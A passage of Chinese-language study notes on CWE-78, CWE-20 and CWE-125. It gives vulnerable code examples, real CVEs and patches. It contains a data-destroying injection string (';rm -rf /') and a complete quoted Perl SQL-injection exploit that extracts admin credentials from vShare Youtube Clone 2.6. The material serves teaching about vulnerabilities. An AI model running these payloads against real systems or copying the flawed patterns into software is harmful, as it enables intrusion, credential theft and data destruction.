</code></pre></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noreferrer">【B】CWE-78: Improper Neutralization of Special Elements used in an OS Command (&#x27;OS Command Injection&#x27;)</a></h3><p class="x-p">操作系统命令注入，类似地，只不过此时是操作系统命令。通常这有两种子类型：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>程序执行某个固定的程序，但是接收外部输入作为程序的参数。</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>程序将整个输入作为命令重定向到操作系统。</p></div></div><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$userName</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ls -l /home/'</span> <span class="token operator">.</span> <span class="token variable">$userName</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">如果缺乏相应的认证，攻击者可以通过命令分隔符执行攻击命令，例如参数传入<code class="x-inline-highlight">;rm -rf /</code>，命令就等价于：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Bash</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token function">ls</span> <span class="token parameter variable">-l</span> /home/<span class="token punctuation">;</span><span class="token function">rm</span> <span class="token parameter variable">-rf</span> /</code></pre></div><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2019-1010200" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2019-1010200</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">patch</code>：<a href="https://github.com/google/voice-builder/commit/c145d4604df67e6fc625992412eef0bf9a85e26b" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/google/voice-builder/commit/c145d4604df67e6fc625992412eef0bf9a85e26b</a></p></div></div><p class="x-p">原本的程序可以通过<code class="x-inline-highlight">req.query.text</code>注入<code class="x-inline-highlight">cmd</code>。补丁对字符串过滤特殊字符，并用<code class="x-inline-highlight">child.stdin.write(sanitizedText)</code>代替<code class="x-inline-highlight">echo</code>命令。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">JavaScript</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 96px, var(--bg-transparent-red) 96px 144px, transparent 144px, transparent 144px, var(--bg-transparent-green) 144px 168px, transparent 168px, transparent 192px, var(--bg-transparent-red) 192px 312px, transparent 312px, transparent 312px, var(--bg-transparent-green) 312px 336px, transparent 336px, transparent 528px, var(--bg-transparent-red) 528px 552px, transparent 552px, transparent 552px, var(--bg-transparent-green) 552px 576px, transparent 576px, transparent 792px, var(--bg-transparent-green) 792px 840px, transparent 840px)"><code><span class="token comment">/** GET synthesize voice based on a voice model */</span>
router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/tts'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> text<span class="token punctuation">,</span> type <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>
  <span class="token comment">// TODO(twattanavekin): Test Unicode text.</span>
  <span class="token keyword">const</span> escapedText <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> sanitizedText <span class="token operator">=</span> utils<span class="token punctuation">.</span><span class="token function">replaceCharactersWithSpaces</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Example command:</span>
  <span class="token comment">//  echo "hello" | ${SYNTH_SCRIPT}</span>

  <span class="token keyword">const</span> cmd <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">echo "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>escapedText<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">" | </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token constant">SYNTH_SCRIPT</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Running command - \n</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>cmd<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Synthesizing </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>sanitizedText<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> options <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">maxBuffer</span><span class="token operator">:</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token comment">// 1 mb buffer</span>
    <span class="token literal-property property">cwd</span><span class="token operator">:</span> <span class="token string">'/tmp/'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">60000</span><span class="token punctuation">,</span> <span class="token comment">// 1 minute timeout</span>
    <span class="token literal-property property">encoding</span><span class="token operator">:</span> <span class="token string">'buffer'</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> options<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> child <span class="token operator">=</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token constant">SYNTH_SCRIPT</span><span class="token punctuation">,</span> options<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> errMsg <span class="token operator">=</span> utils<span class="token punctuation">.</span><span class="token function">getExecErrorMessage</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'audio/wav'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> data <span class="token operator">=</span> type <span class="token operator">===</span> <span class="token string">'base64'</span> <span class="token operator">?</span> stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span> <span class="token operator">:</span> stdout<span class="token punctuation">;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  child<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>sanitizedText<span class="token punctuation">)</span><span class="token punctuation">;</span>
  child<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span>
</code></pre></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noreferrer">【C】CWE-20: Improper Input Validation</a></h3><p class="x-p">输入验证不当，程序接收输入或数据，但没有验证或者错误地验证输入是否具有安全正确地处理数据所需的属性。</p><h4 class="x-h3">Example 1</h4><p class="x-p">没有输入验证。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$birthday</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'birthday'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$homepage</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'homepage'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"生日：<span class="token interpolation"><span class="token variable">$birthday</span></span>&lt;br>主页：&lt;a href=<span class="token interpolation"><span class="token variable">$homepage</span></span>>点击此处&lt;/a>"</span>
</code></pre></div><p class="x-p">这段程序展示用户的生日和主页，但由于这些参数来自于HTTP请求，攻击者可以构造一个含有<code class="x-inline-highlight">script</code>标签的钓鱼链接，并通过参数传入，导致恶意脚本在客户端上执行。</p><p class="x-p">尽管开发者可以限制输入为整数和破折号，攻击者仍有可能提供以下形式的字符串：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>2009-01-09--</code></pre></div><p class="x-p">如果在SQL语句中使用这些数据，它会将语句的其余部分视为注释。注释可能会禁用语句中其他与安全相关的逻辑。</p><p class="x-p">XSS攻击或SQL注入只是输入验证不当可能出现的后果中的一小部分。</p><h4 class="x-h3">Example 2</h4><p class="x-p">有问题的输入验证。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Java</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">buildList</span><span class="token punctuation">(</span><span class="token keyword">int</span> untrustedListSize<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">></span> untrustedListSize<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"Negative value supplied for list size, die evil hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token class-name">Widget</span><span class="token punctuation">[</span><span class="token punctuation">]</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Widget</span><span class="token punctuation">[</span>untrustedListSize<span class="token punctuation">]</span><span class="token punctuation">;</span>
    list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Widget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">这个示例尝试根据用户指定的值构建列表，并判断了提供值为负的情况，但还是忽略了输入<code class="x-inline-highlight">0</code>值的情况，可能导致后续抛出异常。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2008-2223" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2008-2223</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://www.exploit-db.com/exploits/5565" target="_blank" rel="noreferrer" class="x-inline-link">https://www.exploit-db.com/exploits/5565</a></p></div></div><p class="x-p">vShare YouTube Clone 2.6中的<code class="x-inline-highlight">group_posts.php</code>中的SQL注入漏洞，远程攻击者可以通过<code class="x-inline-highlight">tid</code>参数执行任意SQL命令。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Perl</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 384px, var(--bg-transparent-golden) 384px 408px, transparent 408px)"><code><span class="token comment">#!/usr/bin/perl</span>
<span class="token comment"># Coded by: Saime</span>
<span class="token comment"># vShare Youtube Clone v2.6 (group_posts.php tid) Remote SQL Injection</span>
<span class="token comment"># Author: Saime</span>
<span class="token comment"># URL: http://www.buyscripts.in</span>
<span class="token comment"># Price: $10.00</span>
<span class="token comment"># Date: 8/05/2008</span>
<span class="token comment"># Greetz: BaKo,DrWh4x,optiplex,xprog,cam-man-dan,Tulle,t0pP8uZz,Inspiratio,Novalok,illuz1oN,Untamed and everyone else I forgot!</span>
<span class="token comment"># Site: http://h4ck-y0u.org</span>

<span class="token keyword">use</span> LWP<span class="token punctuation">;</span>

<span class="token variable">$site</span> <span class="token operator">=</span> <span class="token variable">@ARGV</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$ua</span> <span class="token operator">=</span> LWP<span class="token punctuation">:</span><span class="token punctuation">:</span>UserAgent<span class="token operator">-></span>new<span class="token punctuation">;</span>

<span class="token keyword">my</span> <span class="token variable">$injection</span> <span class="token operator">=</span> <span class="token string">'group_posts.php?tid=1+union+select+1,2,3,4,concat(username,0x3a,email,0x3a,pwd),6,7+from+signup+limit+0,1--'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">@ARGV</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">&amp;usage</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token variable">&amp;exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">sub</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">print</span> <span class="token string">"[+] Exploiting...\n"</span><span class="token punctuation">;</span>
    <span class="token variable">$passres</span> <span class="token operator">=</span> <span class="token variable">$ua</span><span class="token operator">-></span>get<span class="token punctuation">(</span><span class="token string">"http://$site/$injection"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$exploitcon</span> <span class="token operator">=</span> <span class="token variable">$passres</span><span class="token operator">-></span>content<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$exploitcon</span> <span class="token operator">=~</span> <span class="token regex">m/&lt;b>Topic:&lt;\/b>(.*)&lt;b>(.*):(.*):([a-f0-9]{32})&lt;\/b>&lt;br \/>/gmi</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$4</span><span class="token punctuation">;</span>
        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token variable">$2</span><span class="token punctuation">;</span>
        <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$3</span><span class="token punctuation">;</span>
        <span class="token keyword">print</span> <span class="token string">"[+] Admin Password: $pass\n"</span><span class="token punctuation">;</span>
        <span class="token keyword">print</span> <span class="token string">"[+] Admin Username: $admin\n"</span><span class="token punctuation">;</span>
        <span class="token keyword">print</span> <span class="token string">"[+] Admin Email: $email\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">print</span> <span class="token string">"[-] Unable To Get The Password...\n"</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">sub</span> <span class="token function">usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">print</span> <span class="token string">"Usage: ./vshare.pl [host]\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">print</span> <span class="token string">"Example: ./vshare.pl www.site.com\n"</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/125.html" target="_blank" rel="noreferrer">【B】CWE-125: Out-of-bounds Read</a></h3><p class="x-p">越界读取，在预期缓冲区末尾之后或开头之前读取。</p><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">int</span> <span class="token function">getValueFromArray</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>array<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> value<span class="token punctuation">;</span>

    <span class="token comment">// check that the array index is less than the maximum</span>
    <span class="token comment">// length of the array</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">&lt;</span> len<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>

        <span class="token comment">// get the value at the specified index of the array</span>
        value <span class="token operator">=</span> array<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// if array index is invalid then output error message</span>
    <span class="token comment">// and return value indicating error</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Value is: %d\n"</span><span class="token punctuation">,</span> array<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        value <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> value<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">这段代码只检查了<code class="x-inline-highlight">index &#60; len</code>的情况；在判断条件中还应加入<code class="x-inline-highlight">index &#62;= 0</code>。</p><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2022-1452" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2022-1452</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Exploit</code>：<a href="https://huntr.com/bounties/c8f4c2de-7d96-4ad4-857a-c099effca2d6" target="_blank" rel="noreferrer" class="x-inline-link">https://huntr.com/bounties/c8f4c2de-7d96-4ad4-857a-c099effca2d6</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/radareorg/radare2/commit/ecc44b6a2f18ee70ac133365de0e509d26d5e168" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/radareorg/radare2/commit/ecc44b6a2f18ee70ac133365de0e509d26d5e168</a></p></div></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">C</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 120px, var(--bg-transparent-green) 120px 216px, transparent 216px)"><code><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
offset <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>attr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    attr<span class="token operator">-></span>type <span class="token operator">=</span> R_BIN_JAVA_ATTR_TYPE_BOOTSTRAP_METHODS_ATTR<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">></span> sz<span class="token punctuation">)</span>  <span class="token punctuation">{</span>
        <span class="token function">free</span> <span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    attr<span class="token operator">-></span>info<span class="token punctuation">.</span>bootstrap_methods_attr<span class="token punctuation">.</span>num_bootstrap_methods <span class="token operator">=</span> <span class="token function">R_BIN_JAVA_USHORT</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
    offset <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    attr<span class="token operator">-></span>info<span class="token punctuation">.</span>bootstrap_methods_attr<span class="token punctuation">.</span>bootstrap_methods <span class="token operator">=</span> <span class="token function">r_list_newf</span> <span class="token punctuation">(</span>r_bin_java_bootstrap_method_free<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
